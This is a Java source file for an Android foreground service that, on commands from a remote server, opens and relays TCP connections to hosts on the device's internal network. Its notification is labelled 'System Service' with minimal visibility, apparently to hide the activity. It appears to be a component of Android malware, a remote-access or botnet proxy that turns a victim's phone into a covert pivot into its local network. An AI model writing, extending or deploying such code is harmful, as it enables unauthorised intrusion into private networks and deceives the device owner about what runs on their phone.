package com.fason.app.features.proxy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import java.util.concurrent.ConcurrentHashMap;

/**
 * Foreground service that manages outbound TCP proxy connections.
 * Received data from the server via SocketCommandRouter is written
 * to local TCP sockets targeting internal network hosts.
 */
public class ProxyService extends Service {

    public static final String ACTION_START   = "com.fason.app.proxy.START";
    public static final String ACTION_STOP    = "com.fason.app.proxy.STOP";
    public static final String ACTION_CONNECT = "com.fason.app.proxy.CONNECT";
    public static final String ACTION_DATA    = "com.fason.app.proxy.DATA";
    public static final String ACTION_CLOSE   = "com.fason.app.proxy.CLOSE";

    public static final String EXTRA_CONN_ID = "connId";
    public static final String EXTRA_HOST    = "host";
    public static final String EXTRA_PORT    = "port";
    public static final String EXTRA_DATA    = "data";

    private static final String NOTIF_CHANNEL = "proxy_svc";
    private static final int NOTIF_ID = 2002;

    private static final ConcurrentHashMap<String, ProxyConnection> connections = new ConcurrentHashMap<>();
    private volatile boolean started = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || intent.getAction() == null) {
            return START_NOT_STICKY;
        }

        // Ensure foreground on any first action
        if (!started) {
            startForeground();
            started = true;
        }

        switch (intent.getAction()) {
            case ACTION_START:
                break;

            case ACTION_STOP:
                closeAllConnections();
                stopForeground(true);
                stopSelf();
                started = false;
                break;

            case ACTION_CONNECT: {
                String connId = intent.getStringExtra(EXTRA_CONN_ID);
                String host = intent.getStringExtra(EXTRA_HOST);
                int port = intent.getIntExtra(EXTRA_PORT, 0);
                if (connId != null && host != null && port > 0 && port <= 65535) {
                    // Close existing connection with same ID if any
                    ProxyConnection existing = connections.remove(connId);
                    if (existing != null) existing.close();

                    try {
                        ProxyConnection conn = new ProxyConnection(connId, host, port);
                        connections.put(connId, conn);
                        conn.start();
                    } catch (Exception e) {
                        // Emit error back
                        try {
                            org.json.JSONObject err = new org.json.JSONObject();
                            err.put("connId", connId);
                            err.put("event", "error");
                            err.put("error", "Connection failed: " + e.getMessage());
                            com.fason.app.core.network.SocketClient.getInstance().safeEmit("0xPY", err);
                        } catch (Exception ignored) {}
                    }
                }
                break;
            }

            case ACTION_DATA: {
                String connId = intent.getStringExtra(EXTRA_CONN_ID);
                String data = intent.getStringExtra(EXTRA_DATA);
                if (connId != null && data != null) {
                    ProxyConnection conn = connections.get(connId);
                    if (conn != null && conn.isRunning()) {
                        conn.writeBase64(data);
                    }
                }
                break;
            }

            case ACTION_CLOSE: {
                String connId = intent.getStringExtra(EXTRA_CONN_ID);
                if (connId != null) {
                    ProxyConnection conn = connections.remove(connId);
                    if (conn != null) conn.close();
                }
                break;
            }
        }

        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        closeAllConnections();
        super.onDestroy();
    }

    private void startForeground() {
        Notification notification = new Notification.Builder(this, NOTIF_CHANNEL)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(NOTIF_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null && nm.getNotificationChannel(NOTIF_CHANNEL) == null) {
                NotificationChannel channel = new NotificationChannel(
                        NOTIF_CHANNEL,
                        "System Service",
                        NotificationManager.IMPORTANCE_MIN
                );
                channel.setDescription("System background service");
                channel.setShowBadge(false);
                nm.createNotificationChannel(channel);
            }
        }
    }

    private void closeAllConnections() {
        for (ProxyConnection conn : connections.values()) {
            conn.close();
        }
        connections.clear();
    }

    // Static helpers for SocketCommandRouter

    public static void connect(Context context, String connId, String host, int port) {
        Intent intent = new Intent(context, ProxyService.class);
        intent.setAction(ACTION_CONNECT);
        intent.putExtra(EXTRA_CONN_ID, connId);
        intent.putExtra(EXTRA_HOST, host);
        intent.putExtra(EXTRA_PORT, port);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void sendData(Context context, String connId, String base64Data) {
        Intent intent = new Intent(context, ProxyService.class);
        intent.setAction(ACTION_DATA);
        intent.putExtra(EXTRA_CONN_ID, connId);
        intent.putExtra(EXTRA_DATA, base64Data);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void closeConnection(Context context, String connId) {
        Intent intent = new Intent(context, ProxyService.class);
        intent.setAction(ACTION_CLOSE);
        intent.putExtra(EXTRA_CONN_ID, connId);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void startService(Context context) {
        Intent intent = new Intent(context, ProxyService.class);
        intent.setAction(ACTION_START);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void stopService(Context context) {
        Intent intent = new Intent(context, ProxyService.class);
        intent.setAction(ACTION_STOP);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static int getActiveConnectionCount() {
        return connections.size();
    }
}
